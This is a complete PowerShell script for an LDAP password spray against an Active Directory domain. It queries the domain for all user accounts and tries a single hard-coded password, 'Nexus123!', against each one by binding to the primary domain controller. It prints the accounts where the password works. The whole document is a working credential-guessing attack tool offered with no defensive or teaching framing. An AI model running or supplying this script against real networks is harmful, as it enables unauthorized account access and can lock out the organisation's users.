param(
    [string]$Password = "Nexus123!",
    [string]$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
)

Write-Host "[*] Starting LDAP password spray for domain: $Domain"
$PDC = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner).Name
$LDAP = "LDAP://$PDC/DC=" + $Domain.Replace('.', ',DC=')

# Get all users from AD
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(objectCategory=person)"
$Searcher.PageSize = 1000
$Searcher.PropertiesToLoad.Add("sAMAccountName") > $null
$Users = $Searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

foreach ($User in $Users) {
    if ([string]::IsNullOrWhiteSpace($User)) { continue }

    try {
        $Entry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $User, $Password)
        $null = $Entry.distinguishedName  # Force bind/authentication
        Write-Host "[+] VALID: $User : $Password"
    } catch {
        Write-Host "[-] INVALID: $User"
    }
}
